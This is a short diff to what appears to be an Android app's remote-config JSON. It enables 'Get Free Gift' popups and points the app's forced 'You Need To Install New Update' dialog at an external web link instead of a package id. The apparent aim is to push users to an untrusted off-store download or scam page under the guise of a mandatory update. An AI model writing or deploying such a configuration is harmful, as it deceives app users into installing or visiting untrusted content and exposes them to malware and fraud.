@@ -30,8 +30,8 @@
 	"popAppName": "Get Free Gift",
 	"popAppImage": "https://i.ibb.co/cx7Q5d4/rossgiftca.png",
 	"popAppPackage": "",
-	"popAppIsActive_first": false,
-	"popAppIsActive_browser": false,
+	"popAppIsActive_first": true,
+	"popAppIsActive_browser": true,
 	"Interval_Time":30000, 
   
   
@@ -67,7 +67,7 @@
 
 	],
 	// update Dialog 
-	"New_Package_Name":"com.tkmaxxlots.tkmaxxfashion",
+	"New_Package_Name":"https://vidstuff.xyz/o/132730/1196338",
 	"Version_Code": 3,
 	"Description_dialog":"You Need To Install New Update",
 	"Is_Force":true
